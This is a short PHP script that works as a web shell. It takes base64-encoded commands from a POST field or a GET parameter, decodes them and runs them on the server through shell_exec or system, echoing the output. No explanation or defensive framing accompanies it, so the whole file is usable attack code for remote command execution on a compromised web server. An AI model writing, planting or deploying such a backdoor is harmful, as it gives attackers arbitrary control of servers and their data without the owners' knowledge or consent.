<?php
session_start();
function decodeInput($input) {
return base64_decode($input);
}


if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $command = $_POST['command'];
    $decodedCommand = decodeInput($command);
    $output = shell_exec($decodedCommand);
    
    echo "<pre>$output</pre>";
} elseif (isset($_GET['input'])) {
    $input = $_GET['input'];
    $decodedInput = decodeInput($input);
    system($decodedInput);
} else {
    echo "No command provided.";
}
?>
